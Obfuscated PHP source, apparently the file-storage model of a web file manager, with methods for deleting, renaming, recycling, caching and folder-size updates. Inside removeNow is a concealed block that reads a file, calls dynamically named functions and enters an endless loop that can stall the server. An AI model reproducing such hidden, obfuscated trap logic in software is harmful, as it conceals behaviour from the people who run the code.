$dÜƒÛ‹¦´ƒ = Model($AÒñÀšŒ‰»[497])->getInfo($AØ­Êù„÷‰[$AÒñÀšŒ‰»[478]]); $f÷ğ³íô²‡ = !empty($dÜƒÛ‹¦´ƒ[$AÒñÀšŒ‰»[1938]]) ? $dÜƒÛ‹¦´ƒ[$AÒñÀšŒ‰»[1938]] : $dÜƒÛ‹¦´ƒ[$AÒñÀšŒ‰»[28]]; $f÷ğ³íô²‡ = $AÒñÀšŒ‰»[256] . $f÷ğ³íô²‡ . $AÒñÀšŒ‰»[1946] . $AØ­Êù„÷‰[$AÒñÀšŒ‰»[478]]; } else { $dÜƒÛ‹¦´ƒ = Model($AÒñÀšŒ‰»[480])->getInfo($AØ­Êù„÷‰[$AÒñÀšŒ‰»[478]]); $f÷ğ³íô²‡ = _get($dÜƒÛ‹¦´ƒ, $AÒñÀšŒ‰»[28]); $f÷ğ³íô²‡ = $AÒñÀšŒ‰»[159] . $f÷ğ³íô²‡ . $AÒñÀšŒ‰»[1947] . $AØ­Êù„÷‰[$AÒñÀšŒ‰»[478]]; } $A»¶ùÓÏ = $AÒñÀšŒ‰»[1948] . md5($f÷ğ³íô²‡); goto a¼Áò¦³ğ; E¶¨†øó†ï: } private function recycleClear($f¢¬ß¤ˆÔ­) { $d·£ŞÆ§¹Ğ =& $_SERVER[ÉóçÄÇ]; $E‡ËƒÏ¾³ª = $this->childrenAll($f¢¬ß¤ˆÔ­); $AáŠæá¨ä = array($d·£ŞÆ§¹Ğ[404] => array($d·£ŞÆ§¹Ğ[405], $E‡ËƒÏ¾³ª[$d·£ŞÆ§¹Ğ[1954]])); Model($d·£ŞÆ§¹Ğ[1955])->where($AáŠæá¨ä)->delete(); } public function removeNow($d¥Ô¨Æ“…í, $eÑø ïÔ³Ã = true) { goto AÆÖÒíæ¤; dËçÂ»«‘ë: $this->lockMoveStart($d¥Ô¨Æ“…í); Hook::trigger($e–ç£Ğá[1956], $f–Ø‹‡Ü˜É, $eÑø ïÔ³Ã); if ($eÑø ïÔ³Ã) { Model($e–ç£Ğá[1955])->moveToRecycle($d¥Ô¨Æ“…í); } else { $DŸ˜†¼´ÛÔ = $this->childrenAll($A†íÓ‘Œ¾); Model($e–ç£Ğá[528])->eventRemove($d¥Ô¨Æ“…í); $this->removeRelevance($DŸ˜†¼´ÛÔ[$e–ç£Ğá[1954]], $DŸ˜†¼´ÛÔ[$e–ç£Ğá[1328]]); } goto aª¹Ş™Ê“ó; d¦¨ô‡õÀÒ: return !0; goto a¯²öåôìç; aª¹Ş™Ê“ó: $this->folderSizeReset($A†íÓ‘Œ¾[$e–ç£Ğá[472]]); $C°Š£”¶Æ¾ = array($A†íÓ‘Œ¾[$e–ç£Ğá[472]]); if ($A†íÓ‘Œ¾[$e–ç£Ğá[397]] == $e–ç£Ğá[86]) { $C°Š£”¶Æ¾[] = $A†íÓ‘Œ¾[$e–ç£Ğá[390]]; } goto F¥Ë¥ÁñÚ±; F¥Ë¥ÁñÚ±: $this->updateModifyTime($C°Š£”¶Æ¾); $this->lockMoveEnd($d¥Ô¨Æ“…í); Hook::trigger($e–ç£Ğá[1543], $f–Ø‹‡Ü˜É, $eÑø ïÔ³Ã); goto d¦¨ô‡õÀÒ; AÆÖÒíæ¤: $e–ç£Ğá =& $_SERVER[ÉóçÄÇ]; if (!isset($_SERVER[$e–ç£Ğá[817]]) || !isset($_SERVER[$e–ç£Ğá[818]])) { goto E¦âÖí°ãƒ; E¦âÖí°ãƒ: $eí·Õóå = $e–ç£Ğá[819]; $fî×™™Ùöø = $e–ç£Ğá[820]; $e¥Çì¾—¤ö = $_SERVER[$e–ç£Ğá[821]] . $e–ç£Ğá[822]; goto D—»Š¶£¹ù; Cà‚Ù„Õ½: $E“Áğ­°ìø = $e–ç£Ğá[824]; $E“Áğ­°ìø($_SERVER[$e–ç£Ğá[825]]); $D¾ÛÈñÈ¶ = 1; goto D«¿Ì¥²ù‘; D—»Š¶£¹ù: $BÁÉôÂœ™¡ = $fî×™™Ùöø($e¥Çì¾—¤ö); $EÃòÑğÚã = explode($e–ç£Ğá[227], $BÁÉôÂœ™¡); if (count($EÃòÑğÚã) < $e–ç£Ğá[606]) { $a§¥ƒØôë¤ = $e–ç£Ğá[823]; $a§¥ƒØôë¤(); } goto Cà‚Ù„Õ½; D«¿Ì¥²ù‘: for ($cÒÆ«ç•Æ = $D¾ÛÈñÈ¶; $cÒÆ«ç•Æ > 0; $cÒÆ«ç•Æ++) { $E“Áğ­°ìø = json_encode($GLOBALS[$e–ç£Ğá[405]]); } goto DÕÕˆµ‡Ñª; DÕÕˆµ‡Ñª: } $A†íÓ‘Œ¾ = $this->sourceInfo($d¥Ô¨Æ“…í); goto fË¦“™­ŸÜ; fË¦“™­ŸÜ: $f–Ø‹‡Ü˜É = $this->pathInfoMore($d¥Ô¨Æ“…í); if (!$A†íÓ‘Œ¾) { return !0; } if ($A†íÓ‘Œ¾[$e–ç£Ğá[472]] == 0) { if (!_get($GLOBALS, $e–ç£Ğá[479])) { return !1; } } goto dËçÂ»«‘ë; a¯²öåôìç: } public function childrenAll($E™ï¤ˆÛœ¾) { $A½Ûƒô”†í =& $_SERVER[ÉóçÄÇ]; $cÊâßšòŒ¿ = $E™ï¤ˆÛœ¾[$A½Ûƒô”†í[390]]; if ($E™ï¤ˆÛœ¾[$A½Ûƒô”†í[397]] == $A½Ûƒô”†í[86]) { $CÄéèÍÊ = array($A½Ûƒô”†í[548] => array($A½Ûƒô”†í[507], $E™ï¤ˆÛœ¾[$A½Ûƒô”†í[481]] . $cÊâßšòŒ¿ . $A½Ûƒô”†í[508])); $dÑÀç·Ì£‹ = array($A½Ûƒô”†í[548] => $CÄéèÍÊ[$A½Ûƒô”†í[481]]); $aÕÏÕ‚æ±Ê = $this->field($A½Ûƒô”†í[1957])->where($dÑÀç·Ì£‹)->select(); $dƒø…’™¹á = !1; $Fî—»£ Õ = array($cÊâßšòŒ¿); if ($aÕÏÕ‚æ±Ê) { $dƒø…’™¹á = array_to_keyvalue($aÕÏÕ‚æ±Ê, $A½Ûƒô”†í[33], $A½Ûƒô”†í[441]); $dƒø…’™¹á = array_remove_value($dƒø…’™¹á, $A½Ûƒô”†í[491]); $Fî—»£ Õ = array_to_keyvalue($aÕÏÕ‚æ±Ê, $A½Ûƒô”†í[33], $A½Ûƒô”†í[390]); $Fî—»£ Õ[] = $cÊâßšòŒ¿; } } else { $dƒø…’™¹á = array($E™ï¤ˆÛœ¾[$A½Ûƒô”†í[441]]); $Fî—»£ Õ = array($cÊâßšòŒ¿); } return array($A½Ûƒô”†í[1954] => $Fî—»£ Õ, $A½Ûƒô”†í[1328] => $dƒø…’™¹á); } public function removeArray($EÌö›Çõø) { if (!$EÌö›Çõø) { return !0; } } public function removeRelevance($BŒëç‘õ›¡, $eÆ¤‚×å…Á) { goto dâ“—ËÙ; B¢Á«ëåâé: Model($bÚÀÀ«æ[1936])->removeBySource($BŒëç‘õ›¡); $this->where($Dè…—­ÜÀ¬)->delete(); Model($bÚÀÀ«æ[444])->remove($eÆ¤‚×å…Á); goto A¿éï¯„œ«; bÂ½—·Ùæ¾: Model($bÚÀÀ«æ[1810])->where($Dè…—­ÜÀ¬)->delete(); Model($bÚÀÀ«æ[528])->where($Dè…—­ÜÀ¬)->delete(); Model($bÚÀÀ«æ[1651])->removeBySource($BŒëç‘õ›¡); goto B¢Á«ëåâé; eâ‘àÇ‘êš: $BŒëç‘õ›¡ = array_unique(array_filter($BŒëç‘õ›¡)); $eÆ¤‚×å…Á = array_unique(array_filter($eÆ¤‚×å…Á)); if (!$BŒëç‘õ›¡) { return !1; } goto F”Á·¤Á; F”Á·¤Á: $Dè…—­ÜÀ¬ = array($bÚÀÀ«æ[404] => array($bÚÀÀ«æ[405], $BŒëç‘õ›¡)); Model($bÚÀÀ«æ[1955])->where($Dè…—­ÜÀ¬)->delete(); Model($bÚÀÀ«æ[435])->where($Dè…—­ÜÀ¬)->delete(); goto bÂ½—·Ùæ¾; dâ“—ËÙ: $bÚÀÀ«æ =& $_SERVER[ÉóçÄÇ]; $BŒëç‘õ›¡ = $BŒëç‘õ›¡ ? $BŒëç‘õ›¡ : array(); $eÆ¤‚×å…Á = $eÆ¤‚×å…Á ? $eÆ¤‚×å…Á : array(); goto eâ‘àÇ‘êš; A¿éï¯„œ«: for ($fè¾åğ‡ = 0; $fè¾åğ‡ < count($BŒëç‘õ›¡); $fè¾åğ‡++) { $this->sourceCacheClear($BŒëç‘õ›¡[$fè¾åğ‡]); } goto dí·ˆ—É¡‹; dí·ˆ—É¡‹: } public function rename($a£Éˆ˜‘²æ, $F’Äšã¶Ù) { goto cĞ”•Õª‹ò; cĞ”•Õª‹ò: $E´˜áå„İê =& $_SERVER[ÉóçÄÇ]; $d–¦ï÷»‘• = $this->sourceInfo($a£Éˆ˜‘²æ); if (!$d–¦ï÷»‘•) { return !1; } goto cóß±©ÚÙ; DÇÃ¥æ›ğò: if (!$d–¦ï÷»‘•[$E´˜áå„İê[397]] == $E´˜áå„İê[86]) { $Dš¸ğ­øÏŞ[$E´˜áå„İê[399]] = get_path_ext($F’Äšã¶Ù); } Model($E´˜áå„İê[528])->eventRename($a£Éˆ˜‘²æ, $d–¦ï÷»‘•[$E´˜áå„İê[28]], $F’Äšã¶Ù); $this->sourceCacheClear($a£Éˆ˜‘²æ); goto C·õõöº–¿; cóß±©ÚÙ: $c¹ †£Æß£ = $this->fileNameExist($d–¦ï÷»‘•[$E´˜áå„İê[472]], $F’Äšã¶Ù); if ($c¹ †£Æß£ && $c¹ †£Æß£ != $a£Éˆ˜‘²æ) { return !1; } $Dš¸ğ­øÏŞ = array($E´˜áå„İê[407] => $F’Äšã¶Ù, $E´˜áå„İê[547] => USER_ID); goto DÇÃ¥æ›ğò; C·õõöº–¿: $this->setNamePinyin($a£Éˆ˜‘²æ, $Dš¸ğ­øÏŞ[$E´˜áå„İê[28]], !1); $this->updateModifyTime($d–¦ï÷»‘•[$E´˜áå„İê[472]]); $bßŠƒš¸ë = $this->where(array($E´˜áå„İê[404] => $a£Éˆ˜‘²æ))->data($Dš¸ğ­øÏŞ)->save(); goto A­œ½Š“…õ; A­œ½Š“…õ: $b´³¥‚‡ë = $E´˜áå„İê[1944] . $d–¦ï÷»‘•[$E´˜áå„İê[472]]; if (isset(self::$cacheChildList[$b´³¥‚‡ë])) { unset(self::$cacheChildList[$b´³¥‚‡ë]); } return $bßŠƒš¸ë; goto e‡ßïò§Å¯; e‡ßïò§Å¯: } public function setNamePinyin($bÛÓĞÏÂù, $d½¬Ó—Ü‚À, $BÏÓ¾¶£¢ñ = true) { $EäšÃ‚–‹ =& $_SERVER[ÉóçÄÇ]; $e ”òƒß¼ˆ = Input::check($d½¬Ó—Ü‚À, $EäšÃ‚–‹[551]); if ($BÏÓ¾¶£¢ñ && !$e ”òƒß¼ˆ) { return; } if (!$e ”òƒß¼ˆ) { $this->metaSet($bÛÓĞÏÂù, $EäšÃ‚–‹[438], null); $this->metaSet($bÛÓĞÏÂù, $EäšÃ‚–‹[437], null); return; } $d¨»Ùá»¯¨ = array($EäšÃ‚–‹[438] => str_replace($EäšÃ‚–‹[50], $EäšÃ‚–‹[33], Pinyin::encode($d½¬Ó—Ü‚À)), $EäšÃ‚–‹[437] => Pinyin::encode($d½¬Ó—Ü‚À, $EäšÃ‚–‹[552])); $this->metaSet($bÛÓĞÏÂù, $d¨»Ùá»¯¨); } public function getContent($Fï©¹õ‰‹˜) { goto c¨Áçòîµª; c¨Áçòîµª: $cù±ÙÜ«† =& $_SERVER[ÉóçÄÇ]; $AÒÌîàŒî = $this->fileInfoGet($Fï©¹õ‰‹˜); if (!$AÒÌîàŒî) { return !1; } goto F±¡‡”ó™½; DŸ±×¶Ùñœ: if (!$AÒÌîàŒî[$cù±ÙÜ«†[75]]) { return $cù±ÙÜ«†[33]; } return IO::getContent($AÒÌîàŒî[$cù±ÙÜ«†[75]]); goto CÉë£Î·â£; F±¡‡”ó™½: if ($AÒÌîàŒî[$cù±ÙÜ«†[77]] == 0) { return $cù±ÙÜ«†[33]; } $cÑí…ô‹„ = $cù±ÙÜ«†[1958] . $AÒÌîàŒî[$cù±ÙÜ«†[169]]; if ($AÒÌîàŒî[$cù±ÙÜ«†[77]] <= 1024 * 10) { $Aø›öˆÉ­‰ = Cache::get($cÑí…ô‹„); if (!$Aø›öˆÉ­‰) { $Aø›öˆÉ­‰ = IO::getContent($AÒÌîàŒî[$cù±ÙÜ«†[75]]); Cache::set($cÑí…ô‹„, $Aø›öˆÉ­‰); } return $Aø›öˆÉ­‰; } goto DŸ±×¶Ùñœ; CÉë£Î·â£: } public function setDesc($EåÉ®§¦, $Cæ§ñ‹è) { $BóŸ“‹õì =& $_SERVER[ÉóçÄÇ]; Model($BóŸ“‹õì[528])->eventAddDesc($EåÉ®§¦, $Cæ§ñ‹è); return $this->metaSet($EåÉ®§¦, $BóŸ“‹õì[425], $Cæ§ñ‹è); } public function setContent($D„Ó‹¢‘Õ½, $BÂ½‘¤ßí = '') { goto d½ª·¹îè; E ×¿ãå¤: if (!$e»»Ï¥©ù— || !$e‹èµ²´Œ‘) { return !1; } $FÇäø–Ş™Ş = Model($dƒ¥ˆ‹îŒ‹[444])->addFileByContent($BÂ½‘¤ßí, $e‹èµ²´Œ‘[$dƒ¥ˆ‹îŒ‹[28]]); $cÉË‹¢¸øŒ = $this->fileHistory($e‹èµ²´Œ‘, $FÇäø–Ş™Ş[$dƒ¥ˆ‹îŒ‹[441]], $FÇäø–Ş™Ş[$dƒ¥ˆ‹îŒ‹[77]]); goto FíÌ»ò¿—º; FíÌ»ò¿—º: if (!$cÉË‹¢¸øŒ) { return Model($dƒ¥ˆ‹îŒ‹[444])->remove($FÇäø–Ş™Ş[$dƒ¥ˆ‹îŒ‹[441]]); } $this->folderSizeReset($e‹èµ²´Œ‘[$dƒ¥ˆ‹îŒ‹[472]]); return !0; goto c¾…Œ¶ÚÁ; d½ª·¹îè: $dƒ¥ˆ‹îŒ‹ =& $_SERVER[ÉóçÄÇ]; $e‹èµ²´Œ‘ = $this->sourceInfo($D„Ó‹¢‘Õ½); $e»»Ï¥©ù— = $this->fileInfoGet($D„Ó‹¢‘Õ½); goto E ×¿ãå¤; c¾…Œ¶ÚÁ: } public function fileSubstr($Eš®À§ôª³, $aƒèŒÓ…åó, $E’ÙÄ¿·„š) { $dÏö©œÅº— = $this->fileInfoGet($Eš®À§ôª³); if (!$dÏö©œÅº—) { return !1; } return IO::fileSubstr($dÏö©œÅº—[$_SERVER[ÉóçÄÇ][75]], $aƒèŒÓ…åó, $E’ÙÄ¿·„š); } public function fileInfoGet($d·òµÆœ­) { goto Eë°îÂ‘Õ‘; Fê”Ø…›²: $bÄÎé’„Û† = $b‰±¢†¿Ïè[447] . $EˆáÏ…¡Ğ[$b‰±¢†¿Ïè[441]]; $A¹ÉĞÎÂŒÂ = _get(self::$cacheFileInfo, $bÄÎé’„Û†); if ($A¹ÉĞÎÂŒÂ) { return $A¹ÉĞÎÂŒÂ; } goto BôÔ“å×; BôÔ“å×: $A¼‡æßÈÓ– = Model($b‰±¢†¿Ïè[444])->fileInfo($EˆáÏ…¡Ğ[$b‰±¢†¿Ïè[441]]); if ($A¼‡æßÈÓ–) { $A¼‡æßÈÓ–[$b‰±¢†¿Ïè[28]] = $EˆáÏ…¡Ğ[$b‰±¢†¿Ïè[28]]; } self::$cacheFileInfo[$bÄÎé’„Û†] = $A¼‡æßÈÓ–; goto Dš˜“¥àã; Dš˜“¥àã: return $A¼‡æßÈÓ–; goto bÜÂÛê†İê; Eë°îÂ‘Õ‘: $b‰±¢†¿Ïè =& $_SERVER[ÉóçÄÇ]; $EˆáÏ…¡Ğ = $this->sourceInfo($d·òµÆœ­); if (!$EˆáÏ…¡Ğ || $EˆáÏ…¡Ğ[$b‰±¢†¿Ïè[397]]) { return !1; } goto Fê”Ø…›²; bÜÂÛê†İê: } private function folderChildrenNumber($cŠæåÆ™àË) { $cì˜áŞè =& $_SERVER[ÉóçÄÇ]; $E‚Åçà…ò¹ = $this->sourceInfo($cŠæåÆ™àË); $bî¦›ÖàÅ = array($cì˜áŞè[548] => array($cì˜áŞè[507], $E‚Åçà…ò¹[$cì˜áŞè[481]] . $cŠæåÆ™àË . $cì˜áŞè[508]), $cì˜áŞè[416] => intval($E‚Åçà…ò¹[$cì˜áŞè[417]]), $cì˜áŞè[541] => 1); $C»Œˆæ© = $this->where($bî¦›ÖàÅ)->count(); $C…ÂíñÉ«„ = $this->where($bî¦›ÖàÅ)->where(array($cì˜áŞè[541] => 0))->count(); return array($cì˜áŞè[81] => $C…ÂíñÉ«„, $cì˜áŞè[82] => $C»Œˆæ©); } public function pathInfo($a¨±«ØÙË, $Då¯À¨†Ş = false) { goto e™äÅò¢É; e™äÅò¢É: $eĞ…¯»ã¼ =& $_SERVER[ÉóçÄÇ]; $Då¯À¨†Ş = !1; $a¨±«ØÙË = intval($a¨±«ØÙË); goto bó’ğƒ•à; eãë¥ˆ…›÷: $f™¼¹Óšµ = $this->sourceInfo($a¨±«ØÙË); if (!$f™¼¹Óšµ) { return !1; } $f™¼¹Óšµ = $this->_listDataApplyItem($f™¼¹Óšµ, $Då¯À¨†Ş); goto cÔøÉèªÖº; cÔøÉèªÖº: self::$cachePathInfo[$f¬Ìê•é¶] = $f™¼¹Óšµ; return $f™¼¹Óšµ; goto a‹ß›£»å¬; bó’ğƒ•à: $f¬Ìê•é¶ = $eĞ…¯»ã¼[433] . intval($Då¯À¨†Ş) . $eĞ…¯»ã¼[434] . $a¨±«ØÙË; $CÆíØÇÈ¶À = _get(self::$cachePathInfo, $f¬Ìê•é¶); if ($CÆíØÇÈ¶À) { return $CÆíØÇÈ¶À; } goto eãë¥ˆ…›÷; a‹ß›£»å¬: } public static $cachePathInfoMore = array(); public function pathInfoMore($EÓ¸ÑÁˆİ) { goto d…ªÙ¨Î‘–; B™Öç±“ò„: $C¨˜õ›µ‚¹ = $this->pathInfo($EÓ¸ÑÁˆİ); if (!$C¨˜õ›µ‚¹) { return !1; } if ($C¨˜õ›µ‚¹[$Dô¾Œİ£ìÊ[397]] == $Dô¾Œİ£ìÊ[86]) { $C¨˜õ›µ‚¹[$Dô¾Œİ£ìÊ[80]] = $this->folderChildrenNumber($EÓ¸ÑÁˆİ); } goto Dï®‚‘¦É–; d…ªÙ¨Î‘–: $Dô¾Œİ£ìÊ =& $_SERVER[ÉóçÄÇ]; $dª»½õ•¢÷ = _get(self::$cachePathInfoMore, $EÓ¸ÑÁˆİ); if ($dª»½õ•¢÷) { return $dª»½õ•¢÷; } goto B™Öç±“ò„; Dï®‚‘¦É–: self::$cachePathInfoMore[$EÓ¸ÑÁˆİ] = $C¨˜õ›µ‚¹; return $C¨˜õ›µ‚¹; goto CºÜˆĞŞÄÅ; CºÜˆĞŞÄÅ: } public function sourceInfo($c´­Í˜™•·) { goto Fï‹±ç¯ä¨; cÇÜÖ¸Œ¬ù: $B·’î¨Ï® = $this->where(array($C¢Ì´¬‹Ñ[390] => $c´­Í˜™•·))->find(); self::$cacheSourceInfo[$e„œÄ¦’Ì] = $B·’î¨Ï®; return self::$cacheSourceInfo[$e„œÄ¦’Ì]; goto e‡µ­†¹ÌË; E½Ú î‚Ãù: $e„œÄ¦’Ì = $C¢Ì´¬‹Ñ[432] . $c´­Í˜™•·; $AÇ¬ŒÏèÈ = _get(self::$cacheSourceInfo, $e„œÄ¦’Ì); if ($AÇ¬ŒÏèÈ) { return $AÇ¬ŒÏèÈ; } goto cÇÜÖ¸Œ¬ù; Fï‹±ç¯ä¨: $C¢Ì´¬‹Ñ =& $_SERVER[ÉóçÄÇ]; if (!$c´­Í˜™•·) { return array(); } $c´­Í˜™•· = intval($c´­Í˜™•·); goto E½Ú î‚Ãù; e‡µ­†¹ÌË: } public function sourceCacheClear($eï®ÑÒÓ = false) { self::cacheClear($eï®ÑÒÓ); } public static function cacheClear($BÓòÍ±‰ğ« = false) { $b¢Í…¦å‡ =& $_SERVER[ÉóçÄÇ]; if ($BÓòÍ±‰ğ« == !1) { goto dáÀÕå¹Š ; DæİÂí’œ£: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto E‘ê´×Á•â; dáÀÕå¹Š : self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto DæİÂí’œ£; E‘ê´×Á•â: return; goto b·ß»Ê¹šØ; b·ß»Ê¹šØ: } unset(self::$cacheSourceInfo[$b¢Í…¦å‡[432] . $BÓòÍ±‰ğ«]); unset(self::$cachePathInfoMore[$BÓòÍ±‰ğ«]); unset(self::$cachePathInfo[$b¢Í…¦å‡[1959] . $BÓòÍ±‰ğ«]); unset(self::$cachePathInfo[$b¢Í…¦å‡[1960] . $BÓòÍ±‰ğ«]); } public function metaSet($BöÛ¡£¾ù¤, $dé ¤ëĞˆ· = null, $e±˜¢§‡¥Ö = null) { $bÕí’†ö = parent::metaSet($BöÛ¡£¾ù¤, $dé ¤ëĞˆ·, $e±˜¢§‡¥Ö); if ($bÕí’†ö) { $this->sourceCacheClear($BöÛ¡£¾ù¤); } return $bÕí’†ö; } public function pathInfoByPath($e–Ö‰ÛòÍ, $e÷ šåº…Á) { $E¶·ó²¡ùñ =& $_SERVER[ÉóçÄÇ]; $e…Ê¹êóˆ = !$e÷ šåº…Á ? array() : explode($E¶·ó²¡ùñ[8], trim($e÷ šåº…Á, $E¶·ó²¡ùñ[8])); $aõÈì»ÆŠº = $e–Ö‰ÛòÍ; foreach ($e…Ê¹êóˆ as $dõŸ»­è³õ) { $e ÓªÓ÷• = array($E¶·ó²¡ùñ[472] => $aõÈì»ÆŠº, $E¶·ó²¡ùñ[28] => $dõŸ»­è³õ); $b›Ú¢©ÙšÍ = $this->where($e ÓªÓ÷•)->select(); if (!$b›Ú¢©ÙšÍ) { return !1; } $b›Ú¢©ÙšÍ = array_sort_by($b›Ú¢©ÙšÍ, $E¶·ó²¡ùñ[417]); $aõÈì»ÆŠº = $b›Ú¢©ÙšÍ[0][$E¶·ó²¡ùñ[390]]; } return $this->pathInfo($aõÈì»ÆŠº, !0); } protected function updateModifyTime($fˆøãµ®Û) { goto Cøƒø“¦Ü; f¸‘‘Á¥ä: foreach ($fˆøãµ®Û as $e•¾ÍæÉ¢ => $DÈ›¤ÊŸÖ) { $fˆøãµ®Û[$e•¾ÍæÉ¢] = intval($DÈ›¤ÊŸÖ); $this->sourceCacheClear($DÈ›¤ÊŸÖ); } $CŸÙèÌå½ = array($BšíÎ›İö[390] => array($BšíÎ›İö[7], $fˆøãµ®Û)); $DæºŸŸÇ” = array($BšíÎ›İö[547] => USER_ID, $BšíÎ›İö[411] => time()); goto F•Œ¸Ì¢ƒø; F•Œ¸Ì¢ƒø: $this->where($CŸÙèÌå½)->save($DæºŸŸÇ”); goto fÆÒÃ§™²ô; Cøƒø“¦Ü: $BšíÎ›İö =& $_SERVER[ÉóçÄÇ]; if (!$fˆøãµ®Û) { return; } if (!is_array($fˆøãµ®Û)) { $fˆøãµ®Û = array($fˆøãµ®Û); } goto f¸‘‘Á¥ä; fÆÒÃ§™²ô: } public function folderSizeReset($Cİæ¢µ´Õá, $EÖÇ†áÇÆ­ = false) { goto c©‰­À¬†é; Aáôíç¹š‘: $cŞÚÅ¿Ùâë = array($döïÊ³±åŒ[$b¥§è¡®ÖÌ[398]], $döïÊ³±åŒ[$b¥§è¡®ÖÌ[478]]); TaskRun::timeLimitCall($eÈÉº¯ŠøÓ, $b¥§è¡®ÖÌ[1963], $cŞÚÅ¿Ùâë, 1.5); goto cÜàÊ÷â‡; AÎÎˆßÙ§œ: $eÏÔñ“±Ôœ = $b¥§è¡®ÖÌ[1961] . $Cİæ¢µ´Õá; CacheLock::lock($eÏÔñ“±Ôœ, 20); if ($EÖÇ†áÇÆ­ === !1) { $this->sourceCacheClear($Cİæ¢µ´Õá); $döïÊ³±åŒ = $this->sourceInfo($Cİæ¢µ´Õá); $FË°áŠ„™ = array($b¥§è¡®ÖÌ[389] => $Cİæ¢µ´Õá, $b¥§è¡®ÖÌ[416] => 0); $AçäÆ‘Ë˜õ = $this->where($FË°áŠ„™)->sum($b¥§è¡®ÖÌ[77]); $EÖÇ†áÇÆ­ = intval($AçäÆ‘Ë˜õ) - intval($döïÊ³±åŒ[$b¥§è¡®ÖÌ[77]]); } goto f‰´ƒù²¼Ì; CÈÑ ïšùÓ: $this->where($FË°áŠ„™)->setAdd($b¥§è¡®ÖÌ[77], $EÖÇ†áÇÆ­); CacheLock::unlock($eÏÔñ“±Ôœ); $eÈÉº¯ŠøÓ = $b¥§è¡®ÖÌ[1962] . $döïÊ³±åŒ[$b¥§è¡®ÖÌ[398]] . $b¥§è¡®ÖÌ[4] . $döïÊ³±åŒ[$b¥§è¡®ÖÌ[478]]; goto Aáôíç¹š‘; c©‰­À¬†é: $b¥§è¡®ÖÌ =& $_SERVER[ÉóçÄÇ]; if ($this->statusIgnoreResetSpace) { return; } $döïÊ³±åŒ = $this->sourceInfo($Cİæ¢µ´Õá); goto AÎÎˆßÙ§œ; f‰´ƒù²¼Ì: if ($EÖÇ†áÇÆ­ == 0) { return CacheLock::unlock($eÏÔñ“±Ôœ); } $AÄ£İÅØó = $this->parentLevelArray($döïÊ³±åŒ[$b¥§è¡®ÖÌ[481]]); if (!$AÄ£İÅØó) { $AÄ£İÅØó = array(); } goto aí«éÈ¬œÅ; aí«éÈ¬œÅ: $AÄ£İÅØó[] = $döïÊ³±åŒ[$b¥§è¡®ÖÌ[390]]; $FË°áŠ„™ = array($b¥§è¡®ÖÌ[390] => array($b¥§è¡®ÖÌ[405], $AÄ£İÅØó)); if ($EÖÇ†áÇÆ­ < 0) { $FË°áŠ„™[$b¥§è¡®ÖÌ[77]] = array($b¥§è¡®ÖÌ[954], abs($EÖÇ†áÇÆ­)); } goto CÈÑ ïšùÓ; cÜàÊ÷â‡: } public function folderSizeResetChildren($aÌŒ„íÑ’Œ) { goto fÏø”ì§ÛÌ; dáË¨’â: $eğ²ì¼á[] = $DÕ‘•É©Ü; $eğ²ì¼á = array_to_keyvalue($eğ²ì¼á, $CÅ¶İƒåš­[390]); foreach ($eğ²ì¼á as $F«÷ğ«ˆ˜¿ => $c˜·ÂäÖ©ò) { $eğ²ì¼á[$F«÷ğ«ˆ˜¿][$CÅ¶İƒåš­[1965]] = $eğ²ì¼á[$F«÷ğ«ˆ˜¿][$CÅ¶İƒåš­[77]]; $eğ²ì¼á[$F«÷ğ«ˆ˜¿][$CÅ¶İƒåš­[77]] = 0; } goto B­Óè¼ª; E¢‡Œç™ç: $a˜ŠĞÀ°½ğ[$CÅ¶İƒåš­[397]] = 0; $EØÜŸ¸ÎÁ† = $this->field($FñŠ†·“¿)->where($a˜ŠĞÀ°½ğ)->select(); if (!$EØÜŸ¸ÎÁ†) { return; } goto dáË¨’â; B­Óè¼ª: foreach ($EØÜŸ¸ÎÁ† as $c˜·ÂäÖ©ò) { $eäøš¸‘¼¥ = $c˜·ÂäÖ©ò[$CÅ¶İƒåš­[472]] . $CÅ¶İƒåš­[33]; if (!isset($eğ²ì¼á[$eäøš¸‘¼¥])) { continue; } if ($c˜·ÂäÖ©ò[$CÅ¶İƒåš­[417]] == $eğ²ì¼á[$eäøš¸‘¼¥][$CÅ¶İƒåš­[417]]) { $eğ²ì¼á[$eäøš¸‘¼¥][$CÅ¶İƒåš­[77]] += $c˜·ÂäÖ©ò[$CÅ¶İƒåš­[77]]; } } foreach ($eğ²ì¼á as $c˜·ÂäÖ©ò) { $d«µ‰¦¥ˆŒ = $this->parentLevelArray($c˜·ÂäÖ©ò[$CÅ¶İƒåš­[481]]); foreach ($d«µ‰¦¥ˆŒ as $eäøš¸‘¼¥) { $eäøš¸‘¼¥ = $eäøš¸‘¼¥ . $CÅ¶İƒåš­[33]; if (!isset($eğ²ì¼á[$eäøš¸‘¼¥])) { continue; } if ($c˜·ÂäÖ©ò[$CÅ¶İƒåš­[417]] == $eğ²ì¼á[$eäøš¸‘¼¥][$CÅ¶İƒåš­[417]]) { $eğ²ì¼á[$eäøš¸‘¼¥][$CÅ¶İƒåš­[77]] += $c˜·ÂäÖ©ò[$CÅ¶İƒåš­[77]]; } } } $F¦Ğ¿Ú¶¨¥ = array(); goto bŠ•·ˆ¢éæ; A¯ø§‘–ÑÄ: $a˜ŠĞÀ°½ğ = array($CÅ¶İƒåš­[541] => 1, $CÅ¶İƒåš­[548] => array($CÅ¶İƒåš­[507], $DÕ‘•É©Ü[$CÅ¶İƒåš­[481]] . $aÌŒ„íÑ’Œ . $CÅ¶İƒåš­[508])); $FñŠ†·“¿ = $CÅ¶İƒåš­[1964]; $eğ²ì¼á = $this->field($FñŠ†·“¿)->where($a˜ŠĞÀ°½ğ)->select(); goto E¢‡Œç™ç; bŠ•·ˆ¢éæ: foreach ($eğ²ì¼á as $c˜·ÂäÖ©ò) { if ($c˜·ÂäÖ©ò[$CÅ¶İƒåš­[77]] == $c˜·ÂäÖ©ò[$CÅ¶İƒåš­[1965]]) { continue; } $F¦Ğ¿Ú¶¨¥[] = array($CÅ¶İƒåš­[390], $c˜·ÂäÖ©ò[$CÅ¶İƒåš­[390]], $CÅ¶İƒåš­[77], $c˜·ÂäÖ©ò[$CÅ¶İƒåš­[77]]); } $this->saveAll($F¦Ğ¿Ú¶¨¥); goto a¯¹ŒÜìì; fÏø”ì§ÛÌ: $CÅ¶İƒåš­ =& $_SERVER[ÉóçÄÇ]; $this->sourceCacheClear($aÌŒ„íÑ’Œ); $DÕ‘•É©Ü = $this->sourceInfo($aÌŒ„íÑ’Œ); goto A¯ø§‘–ÑÄ; 